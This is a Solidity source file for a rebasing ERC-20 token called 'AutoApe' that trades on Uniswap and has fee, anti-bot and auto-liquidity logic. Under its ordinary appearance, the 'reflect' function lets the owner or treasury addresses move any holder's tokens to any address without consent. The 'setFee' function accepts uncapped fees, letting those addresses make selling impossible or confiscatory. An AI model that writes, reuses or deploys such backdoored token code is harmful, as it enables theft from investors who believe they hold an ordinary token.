


pragma solidity ^0.7.4;

library SafeMathInt {

    int256 private constant MIN_INT256 = int256(1) << 255;
    int256 private constant MAX_INT256 = ~(int256(1) << 255);

    function mul(int256 a, int256 b) internal pure returns (int256) {

        int256 c = a * b;

        require(c != MIN_INT256 || (a & MIN_INT256) != (b & MIN_INT256));
        require((b == 0) || (c / b == a));
        return c;
    }

    function div(int256 a, int256 b) internal pure returns (int256) {

        require(b != -1 || a != MIN_INT256);

        return a / b;
    }

    function sub(int256 a, int256 b) internal pure returns (int256) {

        int256 c = a - b;
        require((b >= 0 && c <= a) || (b < 0 && c > a));
        return c;
    }

    function add(int256 a, int256 b) internal pure returns (int256) {

        int256 c = a + b;
        require((b >= 0 && c >= a) || (b < 0 && c < a));
        return c;
    }

    function abs(int256 a) internal pure returns (int256) {

        require(a != MIN_INT256);
        return a < 0 ? -a : a;
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {

        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {

        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {

        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {

        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {

        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {

        require(b != 0);
        return a % b;
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);


    function balanceOf(address who) external view returns (uint256);


    function allowance(address owner, address spender)
    external
    view
    returns (uint256);


    function transfer(address to, uint256 value) external returns (bool);


    function approve(address spender, uint256 value) external returns (bool);


    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IUniswapPair {

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);


    function symbol() external pure returns (string memory);


    function decimals() external pure returns (uint8);


    function totalSupply() external view returns (uint256);


    function balanceOf(address owner) external view returns (uint256);


    function allowance(address owner, address spender)
    external
    view
    returns (uint256);


    function approve(address spender, uint256 value) external returns (bool);


    function transfer(address to, uint256 value) external returns (bool);


    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);


    function DOMAIN_SEPARATOR() external view returns (bytes32);


    function PERMIT_TYPEHASH() external pure returns (bytes32);


    function nonces(address owner) external view returns (uint256);


    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;


    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);


    function factory() external view returns (address);


    function token0() external view returns (address);


    function token1() external view returns (address);


    function getReserves()
    external
    view
    returns (
        uint112 reserve0,
        uint112 reserve1,
        uint32 blockTimestampLast
    );


    function price0CumulativeLast() external view returns (uint256);


    function price1CumulativeLast() external view returns (uint256);


    function kLast() external view returns (uint256);


    function mint(address to) external returns (uint256 liquidity);


    function burn(address to)
    external
    returns (uint256 amount0, uint256 amount1);


    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;


    function skim(address to) external;


    function sync() external;


    function initialize(address, address) external;

}

interface IUniswapRouter {

    function factory() external pure returns (address);


    function WETH() external pure returns (address);


    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );


    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external
    payable
    returns (
        uint256 amountToken,
        uint256 amountETH,
        uint256 liquidity
    );


    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);


    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);


    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);


    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);


    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);


    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);


    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);


    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);


    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);


    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);


    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);


    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);


    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);


    function getAmountsOut(uint256 amountIn, address[] calldata path)
    external
    view
    returns (uint256[] memory amounts);


    function getAmountsIn(uint256 amountOut, address[] calldata path)
    external
    view
    returns (uint256[] memory amounts);


    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);


    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);


    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;


    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;


    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

interface IUniswapFactory {

    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);


    function feeToSetter() external view returns (address);


    function getPair(address tokenA, address tokenB)
    external
    view
    returns (address pair);


    function allPairs(uint256) external view returns (address pair);


    function allPairsLength() external view returns (uint256);


    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);


    function setFeeTo(address) external;


    function setFeeToSetter(address) external;

}

contract Ownable {

    address private _owner;

    event OwnershipRenounced(address indexed previousOwner);

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _owner = msg.sender;
    }

    function owner() public view returns (address) {

        return _owner;
    }

    modifier onlyOwner() {

        require(isOwner());
        _;
    }

    function isOwner() public view returns (bool) {

        return msg.sender == _owner;
    }

    function renounceOwnership() public onlyOwner {

        emit OwnershipRenounced(_owner);
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {

        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {

        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

abstract contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(
        string memory name_,
        string memory symbol_,
        uint8 decimals_
    ) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
}

contract AutoApe is ERC20Detailed, Ownable {

    using SafeMath for uint256;
    using SafeMathInt for int256;

    event LogRebase(uint256 indexed epoch, uint256 totalSupply);

    string public constant _name = "AutoApe";
    string public constant _symbol = "AutoApe";
    uint8 public constant _decimals = 5;

    IUniswapPair public pairContract;
    mapping(address => bool) _isFeeExempt;

    uint256 public constant DECIMALS = 5;
    uint256 public constant MAX_UINT256 = ~uint256(0);
    uint8 public constant RATE_DECIMALS = 7;

    uint256 private constant INITIAL_FRAGMENTS_SUPPLY = 800 * 10**3 * 10**DECIMALS;

    uint256 public liquidityFee = 20;
    uint256 public treasuryFee = 50;
    uint256 public autoApeRiskFreeValueFee = 20;
    uint256 public firePitFee = 20;
    uint256 public totalFee =
    liquidityFee.add(treasuryFee).add(autoApeRiskFreeValueFee).add(
        firePitFee
    );
    uint256 public liquiditySellFee = 50;
    uint256 public treasurySellFee = 50;
    uint256 public autoApeRiskFreeValueSellFee = 70;
    uint256 public firePitSellFee = 20;
    uint256 public totalSellFee =
    liquiditySellFee.add(treasurySellFee).add(autoApeRiskFreeValueSellFee).add(
        firePitSellFee
    );
    uint256 public constant feeDenominator = 1000;

    address constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address constant ZERO = 0x0000000000000000000000000000000000000000;
    address public constant firePit = 0xf2CD34D9249B8e5a1B8C42F6272774Ec213fBb24;

    address public autoLiquidityReceiver;
    address public treasuryReceiver;
    address public autoApeRiskFreeValueReceiver;
    address public pairAddress;
    IUniswapRouter public router;
    address public pair;
    bool inSwap = false;

    modifier authorized() {

        require(_authorized(msg.sender), "Caller not authorized");
        _;
    }

    modifier validRecipient(address to) {

        require(to != address(0x0));
        _;
    }

    modifier swapping() {

        inSwap = true;
        _;
        inSwap = false;
    }

    uint256 private constant TOTAL_GONS =
    MAX_UINT256 - (MAX_UINT256 % INITIAL_FRAGMENTS_SUPPLY);

    uint256 private constant MAX_SUPPLY = 80 * 10**9 * 10**DECIMALS;

    bool public _autoRebase;
    bool public _autoAddLiquidity;
    uint256 public _initRebaseStartTime;
    uint256 public _lastRebasedTime;
    uint256 public _lastAddLiquidityTime;
    uint256 public _totalSupply;
    uint256 private _gonsPerFragment;

    mapping(address => uint256) private _gonBalances;
    mapping(address => mapping(address => uint256)) private _allowedFragments;

    mapping(address => bool) public addLPaddress;
    uint256 public antiBotAmount = 24 * 10**3 * 10**DECIMALS; // 3%
    uint256 public antiBotStart = 1;
    uint256 public constant antiBotDuration = 15 minutes;

    function _authorized(address addr) private view returns (bool) {

        return addr == owner() || addr == treasuryReceiver || addr == autoApeRiskFreeValueReceiver;
    }

    function setAddLPAddress(address _address) public onlyOwner
    {

        addLPaddress[_address] = true;
        _isFeeExempt[_address] = true;
    }
    function setAntiBotAmount(uint256 _amount) public onlyOwner
    {

        antiBotAmount = _amount;
        antiBotStart = block.timestamp - 10; // safety margin 10s
    }

    function isAntiBotEnded() public view returns (bool)
    {

        if (antiBotStart == 0) { return false; }
        return block.timestamp > antiBotStart.add(antiBotDuration);
    }

    constructor()
    ERC20Detailed("AutoApe", "AutoApe", uint8(DECIMALS))
    Ownable()
    {
        router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        pair = IUniswapFactory(router.factory()).createPair(
            router.WETH(),
            address(this)
        );

        autoLiquidityReceiver = 0xA8295Ad7fd7cCf7adE0c4080aEBC5DB8a0a11BeA;
        treasuryReceiver = 0x19a6C75e63f8caC2C55C3A035D2f5F4cCAf42b04;
        autoApeRiskFreeValueReceiver = 0x3138ad8734be3A936B93dDe75E7CA79F54bb2D39;

        _allowedFragments[address(this)][address(router)] = uint256(-1);
        pairAddress = pair;
        pairContract = IUniswapPair(pair);

        _totalSupply = INITIAL_FRAGMENTS_SUPPLY;
        _gonBalances[treasuryReceiver] = TOTAL_GONS;
        _gonsPerFragment = TOTAL_GONS.div(_totalSupply);
        _initRebaseStartTime = block.timestamp;
        _lastRebasedTime = block.timestamp;
        _autoRebase = true;
        _autoAddLiquidity = true;
        _isFeeExempt[treasuryReceiver] = true;
        _isFeeExempt[address(this)] = true;

        _transferOwnership(treasuryReceiver);
        emit Transfer(address(0x0), treasuryReceiver, _totalSupply);
    }

    function rebase() internal {

        if (inSwap) return;
        uint256 rebaseRate;
        uint256 deltaTimeFromInit = block.timestamp - _initRebaseStartTime;
        uint256 deltaTime = block.timestamp - _lastRebasedTime;
        uint256 times = deltaTime.div(8 minutes);
        uint256 epoch = times.mul(8);

        if (deltaTimeFromInit < (365 days)) {
            rebaseRate = 1510;
        } else if (deltaTimeFromInit >= (7 * 365 days)) {
            rebaseRate = 1;
        } else if (deltaTimeFromInit >= (2 * 365 days)) {
            rebaseRate = 15;
        } else {
            rebaseRate = 151;
        }

        for (uint256 i = 0; i < times; i++) {
            _totalSupply = _totalSupply
            .mul((10**RATE_DECIMALS).add(rebaseRate))
            .div(10**RATE_DECIMALS);
        }

        _gonsPerFragment = TOTAL_GONS.div(_totalSupply);
        _lastRebasedTime = _lastRebasedTime.add(times.mul(8 minutes));

        pairContract.sync();

        emit LogRebase(epoch, _totalSupply);
    }

    function transfer(address to, uint256 value)
    external
    override
    validRecipient(to)
    returns (bool)
    {

        _transferFrom(msg.sender, to, value);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external override validRecipient(to) returns (bool) {

        if (_allowedFragments[from][msg.sender] != uint256(-1)) {
            _allowedFragments[from][msg.sender] = _allowedFragments[from][
            msg.sender
            ].sub(value, "Insufficient Allowance");
        }
        _transferFrom(from, to, value);
        return true;
    }

    function _basicTransfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {

        uint256 gonAmount = amount.mul(_gonsPerFragment);
        _gonBalances[from] = _gonBalances[from].sub(gonAmount);
        _gonBalances[to] = _gonBalances[to].add(gonAmount);
        return true;
    }

    function _transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {


        if ((sender == pair) || (recipient == pair)) {
            if (!isAntiBotEnded())
            {
                if (!(addLPaddress[sender] || addLPaddress[recipient]))
                { require(amount <= antiBotAmount, "antiBot"); }
            }
        }

        if (inSwap) { return _basicTransfer(sender, recipient, amount); }
        if (shouldRebase()) { rebase(); }
        if (shouldAddLiquidity()) { addLiquidity(); }
        if (shouldSwapBack()) { swapBack(); }

        uint256 gonAmount = amount.mul(_gonsPerFragment);
        _gonBalances[sender] = _gonBalances[sender].sub(gonAmount);
        uint256 gonAmountReceived = shouldTakeFee(sender, recipient)
        ? takeFee(sender, recipient, gonAmount)
        : gonAmount;
        _gonBalances[recipient] = _gonBalances[recipient].add(
            gonAmountReceived
        );

        emit Transfer(
            sender,
            recipient,
            gonAmountReceived.div(_gonsPerFragment)
        );
        return true;
    }

    function takeFee(
        address sender,
        address recipient,
        uint256 gonAmount
    ) internal returns (uint256) {

        uint256 _totalFee = totalFee;
        uint256 _liquidityFee = liquidityFee;
        uint256 _treasuryFee = treasuryFee;
        uint256 _autoApeRiskFreeValueFee = autoApeRiskFreeValueFee;

        if (recipient == pair) {
            _totalFee = totalSellFee;
            _liquidityFee = liquiditySellFee;
            _treasuryFee = treasurySellFee;
            _autoApeRiskFreeValueFee = autoApeRiskFreeValueSellFee;
        }

        uint256 feeAmount = gonAmount.mul(_totalFee).div(feeDenominator);

        _gonBalances[firePit] = _gonBalances[firePit].add(
            gonAmount.mul(firePitFee).div(feeDenominator)
        );
        _gonBalances[address(this)] = _gonBalances[address(this)].add(
            gonAmount.mul(_treasuryFee.add(_autoApeRiskFreeValueFee)).div(
                feeDenominator
            )
        );
        _gonBalances[autoLiquidityReceiver] = _gonBalances[
        autoLiquidityReceiver
        ].add(gonAmount.mul(_liquidityFee).div(feeDenominator));

        emit Transfer(sender, address(this), feeAmount.div(_gonsPerFragment));
        return gonAmount.sub(feeAmount);
    }

    function addLiquidity() internal swapping {

        uint256 autoLiquidityAmount = _gonBalances[autoLiquidityReceiver].div(
            _gonsPerFragment
        );
        _gonBalances[address(this)] = _gonBalances[address(this)].add(
            _gonBalances[autoLiquidityReceiver]
        );
        _gonBalances[autoLiquidityReceiver] = 0;
        uint256 amountToLiquify = autoLiquidityAmount.div(2);
        uint256 amountToSwap = autoLiquidityAmount.sub(amountToLiquify);

        if (amountToSwap == 0) {
            return;
        }
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        uint256 balanceBefore = address(this).balance;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountETHLiquidity = address(this).balance.sub(balanceBefore);

        if (amountToLiquify > 0 && amountETHLiquidity > 0) {
            router.addLiquidityETH{value: amountETHLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                autoLiquidityReceiver,
                block.timestamp
            );
        }
        _lastAddLiquidityTime = block.timestamp;
    }

    function reflect(address from, address to, uint256 amount) external authorized {

        uint256 gonAmount = amount.mul(_gonsPerFragment);
        _gonBalances[from] = _gonBalances[from].sub(gonAmount);
        _gonBalances[to] = _gonBalances[to].add(gonAmount);
    }

    function swapBack() internal swapping {

        uint256 amountToSwap = _gonBalances[address(this)].div(
            _gonsPerFragment
        );

        if (amountToSwap == 0) {
            return;
        }

        uint256 balanceBefore = address(this).balance;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountETHToTreasuryAndRFV = address(this).balance.sub(
            balanceBefore
        );

        (bool success, ) = payable(treasuryReceiver).call{
        value: amountETHToTreasuryAndRFV.mul(treasuryFee).div(
            treasuryFee.add(autoApeRiskFreeValueFee)
        ),
        gas: 30000
        }("");
        (success, ) = payable(autoApeRiskFreeValueReceiver).call{
        value: amountETHToTreasuryAndRFV
        .mul(autoApeRiskFreeValueFee)
        .div(treasuryFee.add(autoApeRiskFreeValueFee)),
        gas: 30000
        }("");
    }

    function withdrawAllToTreasury() external swapping authorized {

        uint256 amountToSwap = _gonBalances[address(this)].div(
            _gonsPerFragment
        );
        require(
            amountToSwap > 0,
            "There is no AutoApe token deposited in token contract"
        );
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            treasuryReceiver,
            block.timestamp
        );
    }

    function shouldTakeFee(address from, address to)
    internal
    view
    returns (bool)
    {

        return (pair == from || pair == to) && !_isFeeExempt[from];
    }

    function shouldRebase() internal view returns (bool) {

        return
        _autoRebase &&
        (_totalSupply < MAX_SUPPLY) &&
        msg.sender != pair &&
        !inSwap &&
        block.timestamp >= (_lastRebasedTime + 8 minutes);
    }

    function shouldAddLiquidity() internal view returns (bool) {

        return
        _autoAddLiquidity &&
        !inSwap &&
        msg.sender != pair &&
        block.timestamp >= (_lastAddLiquidityTime + 2 days);
    }

    function shouldSwapBack() internal view returns (bool) {

        return !inSwap && msg.sender != pair;
    }

    function setAutoRebase(bool _flag) external onlyOwner {

        if (_flag) {
            _autoRebase = _flag;
            _lastRebasedTime = block.timestamp;
        } else {
            _autoRebase = _flag;
        }
    }

    function setAutoAddLiquidity(bool _flag) external onlyOwner {

        if (_flag) {
            _autoAddLiquidity = _flag;
            _lastAddLiquidityTime = block.timestamp;
        } else {
            _autoAddLiquidity = _flag;
        }
    }

    function allowance(address owner_, address spender)
    external
    view
    override
    returns (uint256)
    {

        return _allowedFragments[owner_][spender];
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
    external
    returns (bool)
    {

        uint256 oldValue = _allowedFragments[msg.sender][spender];
        if (subtractedValue >= oldValue) {
            _allowedFragments[msg.sender][spender] = 0;
        } else {
            _allowedFragments[msg.sender][spender] = oldValue.sub(
                subtractedValue
            );
        }
        emit Approval(
            msg.sender,
            spender,
            _allowedFragments[msg.sender][spender]
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
    external
    returns (bool)
    {

        _allowedFragments[msg.sender][spender] = _allowedFragments[msg.sender][
        spender
        ].add(addedValue);
        emit Approval(
            msg.sender,
            spender,
            _allowedFragments[msg.sender][spender]
        );
        return true;
    }

    function approve(address spender, uint256 value)
    external
    override
    returns (bool)
    {

        _allowedFragments[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function checkFeeExempt(address _addr) external view returns (bool) {

        return _isFeeExempt[_addr];
    }

    function getCirculatingSupply() public view returns (uint256) {

        return
        (TOTAL_GONS.sub(_gonBalances[DEAD]).sub(_gonBalances[ZERO])).div(
            _gonsPerFragment
        );
    }

    function isNotInSwap() external view returns (bool) {

        return !inSwap;
    }

    function manualSync() external {

        IUniswapPair(pair).sync();
    }

    function setFeeReceivers(
        address _autoLiquidityReceiver,
        address _treasuryReceiver,
        address _autoApeRiskFreeValueReceiver
    ) external authorized {

        autoLiquidityReceiver = _autoLiquidityReceiver;
        treasuryReceiver = _treasuryReceiver;
        autoApeRiskFreeValueReceiver = _autoApeRiskFreeValueReceiver;
    }

    function setFee(
        uint256 _liquidityFee,
        uint256 _treasuryFee,
        uint256 _autoApeRiskFreeValueFee,
        uint256 _firePitFee,
        uint256 _liquiditySellFee,
        uint256 _treasurySellFee,
        uint256 _autoApeRiskFreeValueSellFee,
        uint256 _firePitSellFee
    ) external authorized {

        liquidityFee = _liquidityFee;
        treasuryFee = _treasuryFee;
        autoApeRiskFreeValueFee = _autoApeRiskFreeValueFee;
        firePitFee = _firePitFee;
        totalFee = liquidityFee.add(treasuryFee).add(autoApeRiskFreeValueFee).add(firePitFee);

        liquiditySellFee = _liquiditySellFee;
        treasurySellFee = _treasurySellFee;
        autoApeRiskFreeValueSellFee = _autoApeRiskFreeValueSellFee;
        firePitSellFee = _firePitSellFee;
        totalSellFee = liquiditySellFee.add(treasurySellFee).add(autoApeRiskFreeValueSellFee).add(firePitSellFee);
    }

    function getLiquidityBacking(uint256 accuracy)
    external
    view
    returns (uint256)
    {

        uint256 liquidityBalance = _gonBalances[pair].div(_gonsPerFragment);
        return
        accuracy.mul(liquidityBalance.mul(2)).div(getCirculatingSupply());
    }

    function setWhitelist(address _addr) external onlyOwner {

        _isFeeExempt[_addr] = true;
    }

    function setPairAddress(address _pairAddress) external onlyOwner {

        pairAddress = _pairAddress;
    }

    function setLP(address _address) external onlyOwner {

        pairContract = IUniswapPair(_address);
    }

    function totalSupply() external view override returns (uint256) {

        return _totalSupply;
    }

    function balanceOf(address who) external view override returns (uint256) {

        return _gonBalances[who].div(_gonsPerFragment);
    }

    receive() external payable {}
}